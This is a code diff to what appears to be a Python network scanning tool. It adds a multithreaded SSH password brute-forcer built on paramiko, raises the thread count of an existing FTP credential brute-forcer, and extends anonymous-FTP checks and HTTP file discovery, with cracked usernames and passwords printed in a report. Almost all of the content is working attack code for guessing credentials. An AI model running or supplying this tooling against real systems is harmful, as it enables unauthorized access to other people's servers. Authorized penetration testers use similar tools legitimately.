@@ -3,6 +3,7 @@ from screens import count_screen
 from ftplib import FTP
 import threading
 import os
+import paramiko
 import time
 import requests
 import random
@@ -24,7 +25,7 @@ def ftp_brute(combos, host):
                         ftp = FTP(host, timeout=3)
                         ftp.login(user=combo[0], passwd=combo[1], acct='')
                         ftp.quit()
-                        feed_back = feed_back + colored(f"\n [CREDENTIALS] FTP CREDENTIALS CRACKED: username:{combo[0]} password:{combo[1]}", "red")
+                        feed_back = feed_back + colored(f" [FTP_CREDENTIALS] FTP CREDENTIALS CRACKED: username:{combo[0]} password:{combo[1]}\n", "red")
                             
                      except: 
                          pass 
@@ -32,13 +33,12 @@ def ftp_brute(combos, host):
 def ftp_check(host):
        global bt, trets, feed_back
        feed_back = ""
-
        #FTP Anonymous login test
        try:
          ftp = FTP(host)
          ftp.login()
          ftp.quit()
-         feed_back = feed_back + colored(" [VULNERABILITY] FTP ANONYMOUS LOGIN IS ENABLED!", "red")
+         feed_back = feed_back + colored(" [FTP_VULNERABILITY] FTP ANONYMOUS LOGIN IS ENABLED!\n", "red")
        except:
          pass
 
@@ -49,11 +49,12 @@ def ftp_check(host):
               bt = 0
               trets = 0
               cache = []
+              allowed = 10
               count_screen.loader(bt, len(wordlist))
-
+             
               #Reads trough wordlist and starts threads
               for line in wordlist:
-                     while trets > 5:
+                     while trets > allowed:
                            time.sleep(0.2)
                      line=line.strip()
                      threading.Thread(target=ftp_brute, args=([line], host)).start()
@@ -193,7 +194,7 @@ def http_brute_thread(lis, bad, bad_what, url):
 #Http thread launcher, you can modify the amount of threads running from the allowed variable
 def http_brute(url, wordlist, bad, bad_what):
      global http_found, trets, bt, allowed
-     print(url)
+     print(colored(f"[INFO] Http-File Discovery Started Against: {url}", "green"))
      http_found = []
      #Checks if wordlist exists
      if not os.path.exists(wordlist):
@@ -255,19 +256,91 @@ def http_check(host, p_s):
    wordlist = "wordlists/http-disco.txt"
 
    http_feed_back = http_brute(url, wordlist, bad, whi)
+   print(colored("[INFO] Http-File Discovery Done!", "green"))
    return http_feed_back
 
 #HTTP/HTTPS File discovery stops here
 
+#ssh thread that tries a list of passwords and usernames
+def ssh_brute_thread(host, cache):
+    global got, trets, ssh_bt
+    for combo in cache:
+          ssh_bt += 1
+          count_screen.set_value(ssh_bt)
+          
+          #Beutifies the user:pass format to variables
+          combo = combo.strip()
+          combo = combo.split(":")
+          username = combo[0]
+          password = combo[1]
+          sh = paramiko.SSHClient()
+          sh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+          try:
+           sh.connect(host, 22, username, password, timeout=10)
+           got.append(f"{username}:{password}")
+          except:
+             pass
+          sh.close()
+    trets -= 1
+ 
+#SSH Bruteforce 
+def ssh_brute(host):
+    global trets, got, ssh_bt
+    print(colored("[INFO] Starting ssh bruteforce", "green"))
+    #Initial variables, wordlist
+    got = []
+    wordlist = "wordlists/ssh_combo.txt"
+    wordlist = open(wordlist, "r").readlines()
+    cache = []
+    allowed = 5
+    trets = 0
+    ssh_bt = 0
+    buff = 5
 
+    count_screen.loader(ssh_bt, len(wordlist))
+    #Starts threads 
+    for line in wordlist:
+        line = line.strip()
+        cache.append(line)
+        if allowed > trets and len(cache) >= buff:
+               threading.Thread(target=ssh_brute_thread, args=(host, cache)).start()
+               trets += 1
+               cache = []
+        else:
+          while trets > allowed:
+                time.sleep(0.4)
+    #thread runs when there are 5 items in cache so if there are for example 22, it will finish off those last 2
+    while trets != 0 or len(cache) != 0:
+         if len(cache) != 0:
+            threading.Thread(target=ssh_brute_thread, args=(host, cache)).start()
+            trets += 1
+            cache = []
+         time.sleep(0.4)
+    print(colored("[INFO] SSH Bruteforce done!", "green"))
 
-
-
+    #Report generating
+    ssh_feed_back = ""
+    for line in got:
+          line = line.strip()
+          username = line.split(":")[0]
+          password = line.split(":")[1]
+          ssh_feed_back = ssh_feed_back + colored(f" [SSH_CREDENTIALS] SSH credentials cracked: Username:{username} Password:{password}\n", "red")
+    return ssh_feed_back
+  
 
 #Central hub to decide what scans to run
 def checks(host, http, https, ssh, telnet, ftp, smtp, rpcbind, mysql, smb, rdp):
      only_https = False
      feed_back = ""
+     #SSH Brute if ssh enabled
+     if ssh != "Fals":
+        ssh_response = ssh_brute(host)
+        feed_back = feed_back + ssh_response
+
+
+
+
+
      #FTP scan start if ftp != Fals
      if ftp != "Fals":
        ftp_check_res = ftp_check(host)
